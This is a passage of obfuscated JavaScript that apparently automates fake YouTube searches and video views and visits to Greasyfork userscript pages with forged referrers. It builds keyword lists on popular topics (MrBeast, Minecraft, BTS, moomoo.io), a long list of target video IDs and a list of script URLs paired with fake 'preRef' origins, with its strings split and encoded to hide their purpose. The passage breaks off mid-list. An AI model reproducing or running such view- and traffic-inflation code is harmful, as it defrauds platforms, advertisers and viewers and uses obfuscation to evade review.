searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + X(0xb, 'L8%*') + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + Z(0x13) + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x34f * 0x8 + -0x241 * -0x3 + -0x2131)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x24ad + 0x19ca + -0x3e6d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x133c + -0xc6f + 0x32b * 0xa);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    Z(0x6) + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    a0(0xc) + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0x14, '3JIC') + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + a0(0x20)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Z(0x19) + 'easyfork.o' + Z(0x4) + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x7)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0x4) + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
